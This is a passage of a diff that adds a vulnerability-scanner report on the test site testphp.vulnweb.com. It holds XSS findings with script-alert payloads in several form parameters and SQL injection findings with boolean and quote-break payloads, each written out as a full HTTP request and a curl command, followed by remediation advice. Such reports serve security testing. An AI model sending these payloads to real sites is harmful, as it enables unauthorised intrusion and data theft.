+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/guestbook.php
+                                    <br>
+                                    content-length: 98
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    name=anonymous%20user&amp;submit=add%20message&amp;text=%3CScRiPt%3Ealert%28%27w3zqlx0lns%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-8-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/guestbook.php&#34; -e &#34;http://testphp.vulnweb.com/guestbook.php&#34; -d &#34;name=anonymous%20user&amp;submit=add%20message&amp;text=%3CScRiPt%3Ealert%28%27w3zqlx0lns%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-8-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /search.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-9-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-9-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-9-4">cURL command line</a>
+                            <a href="#tab-vuln-18-9-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-9-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter searchFor</pre>
+                        </section>
+                        <section id="tab-vuln-18-9-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /search.php?test=query HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/
+                                    <br>
+                                    content-length: 76
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    searchFor=%3CScRiPt%3Ealert%28%27wuictt0vz1%27%29%3C%2FsCrIpT%3E&amp;goButton=go
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-9-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/search.php?test=query&#34; -e &#34;http://testphp.vulnweb.com/&#34; -d &#34;searchFor=%3CScRiPt%3Ealert%28%27wuictt0vz1%27%29%3C%2FsCrIpT%3E&amp;goButton=go&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-9-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-10-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-10-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-10-4">cURL command line</a>
+                            <a href="#tab-vuln-18-10-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-10-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter uuname</pre>
+                        </section>
+                        <section id="tab-vuln-18-10-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 205
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=%3CScRiPt%3Ealert%28%22wq72oyf3j9%22%29%3C%2FsCrIpT%3E&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-10-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=%3CScRiPt%3Ealert%28%22wq72oyf3j9%22%29%3C%2FsCrIpT%3E&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-10-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-11-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-11-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-11-4">cURL command line</a>
+                            <a href="#tab-vuln-18-11-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-11-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter urname</pre>
+                        </section>
+                        <section id="tab-vuln-18-11-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 205
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=%3CScRiPt%3Ealert%28%27wwut1nu1tb%27%29%3C%2FsCrIpT%3E&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-11-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=%3CScRiPt%3Ealert%28%27wwut1nu1tb%27%29%3C%2FsCrIpT%3E&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-11-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-12-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-12-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-12-4">cURL command line</a>
+                            <a href="#tab-vuln-18-12-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-12-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter ucc</pre>
+                        </section>
+                        <section id="tab-vuln-18-12-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 205
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=%3CScRiPt%3Ealert%28%27wkoi8j275z%27%29%3C%2FsCrIpT%3E&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-12-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=%3CScRiPt%3Ealert%28%27wkoi8j275z%27%29%3C%2FsCrIpT%3E&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-12-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-13-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-13-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-13-4">cURL command line</a>
+                            <a href="#tab-vuln-18-13-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-13-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter uemail</pre>
+                        </section>
+                        <section id="tab-vuln-18-13-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 184
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=%3CScRiPt%3Ealert%28%27wj8i03p5cz%27%29%3C%2FsCrIpT%3E&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-13-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=%3CScRiPt%3Ealert%28%27wj8i03p5cz%27%29%3C%2FsCrIpT%3E&amp;uphone=default&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-13-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-14-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-14-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-14-4">cURL command line</a>
+                            <a href="#tab-vuln-18-14-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-14-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter uphone</pre>
+                        </section>
+                        <section id="tab-vuln-18-14-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 205
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=%3CScRiPt%3Ealert%28%27wdj8fxbost%27%29%3C%2FsCrIpT%3E&amp;signup=signup&amp;uaddress=Hi%20there%21
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-14-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=%3CScRiPt%3Ealert%28%27wdj8fxbost%27%29%3C%2FsCrIpT%3E&amp;signup=signup&amp;uaddress=Hi%20there%21&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-14-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+                        <h4>🟠 Vulnerability found in /secured/newuser.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score medium">6.1</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-18-15-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-18-15-2">HTTP Request</a>
+                            <a href="#tab-vuln-18-15-4">cURL command line</a>
+                            <a href="#tab-vuln-18-15-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-18-15-1" style="min-height: 124px;">
+                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter uaddress</pre>
+                        </section>
+                        <section id="tab-vuln-18-15-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    POST /secured/newuser.php HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    referer: http://testphp.vulnweb.com/signup.php
+                                    <br>
+                                    content-length: 201
+                                    <br>
+                                    Content-Type: application/x-www-form-urlencoded
+                                    <br>
+                                    
+                                    <br>
+                                    uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=%3CScRiPt%3Ealert%28%27wuf1ggkat0%27%29%3C%2FsCrIpT%3E
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-18-15-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/secured/newuser.php&#34; -e &#34;http://testphp.vulnweb.com/signup.php&#34; -d &#34;uuname=default&amp;upass=Letm3in_&amp;upass2=Letm3in_&amp;urname=default&amp;ucc=default&amp;uemail=pentora2025%40mailinator.com&amp;uphone=default&amp;signup=signup&amp;uaddress=%3CScRiPt%3Ealert%28%27wuf1ggkat0%27%29%3C%2FsCrIpT%3E&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-18-15-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding: <, >, &, ', (, ), #, %, ; , +, -</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP: Cross Site Scripting (XSS)</a></li>
+                    <li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia: Cross-site scripting</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (&#39;Cross-site Scripting&#39;)</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP: Reflected Cross Site Scripting</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_21">SQL Injection</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>SQL injection vulnerabilities allow an attacker to alter the queries executed on the backend database. An attacker may then be able to extract or modify information stored in the database or even escalate his privileges on the system. Blind SQL injection is a technique that exploits a vulnerability occurring in the database of an application. This kind of vulnerability is harder to detect than basic SQL injections because no error message will be displayed on the webpage.</dd>
+                    <dt>CVSS Score</dt>
+                    <dd>
+                        <span class="cvss-score high">8.6</span>
+                        <span class="cvss-severity">High</span>
+                        <span class="cvss-vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L</span>
+                    </dd>
+                </dl>
+
+                        <h4>🔥 Vulnerability found in /artists.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-0-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-0-4">cURL command line</a>
+                            <a href="#tab-vuln-21-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-0-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /artists.php?artist=3%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/artists.php?artist=3%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /artists.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-1-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-1-4">cURL command line</a>
+                            <a href="#tab-vuln-21-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-1-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /artists.php?artist=1%20AND%2084%3D84%20AND%2099%3D99 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-1-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/artists.php?artist=1%20AND%2084%3D84%20AND%2099%3D99&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-1-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /artists.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-2-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-2-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-2-4">cURL command line</a>
+                            <a href="#tab-vuln-21-2-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-2-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter artist</pre>
+                        </section>
+                        <section id="tab-vuln-21-2-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /artists.php?artist=2%20AND%2046%3D46%20AND%2023%3D23 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-2-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/artists.php?artist=2%20AND%2046%3D46%20AND%2023%3D23&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-2-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-3-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-3-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-3-4">cURL command line</a>
+                            <a href="#tab-vuln-21-3-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-3-1" style="min-height: 124px;">
+                            <pre>SQL Injection (DBMS: MySQL) via injection in the parameter cat</pre>
+                        </section>
+                        <section id="tab-vuln-21-3-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?cat=3%C2%BF%27%22%28 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-3-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?cat=3%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-3-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-4-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-4-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-4-4">cURL command line</a>
+                            <a href="#tab-vuln-21-4-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-4-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter cat</pre>
+                        </section>
+                        <section id="tab-vuln-21-4-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal">
+                                    GET /listproducts.php?cat=2%20AND%2040%3D40%20AND%2062%3D62 HTTP/1.1
+                                    <br>
+                                    host: testphp.vulnweb.com
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                            </pre>
+                        </section>
+                        <section id="tab-vuln-21-4-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://testphp.vulnweb.com/listproducts.php?cat=2%20AND%2040%3D40%20AND%2062%3D62&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-4-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+                        <h4>🔥 Vulnerability found in /listproducts.php 
+                        <span class="cvss-score-label">CVSS: <span class="cvss-score high">8.6</span></span>
+                        </h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-21-5-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-21-5-2">HTTP Request</a>
+                            <a href="#tab-vuln-21-5-4">cURL command line</a>
+                            <a href="#tab-vuln-21-5-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-21-5-1" style="min-height: 124px;">
+                            <pre>SQL Injection via injection in the parameter cat</pre>
+                        </section>
+                        <section id="tab-vuln-21-5-2" style="min-height: 124px;" class="is-hidden">
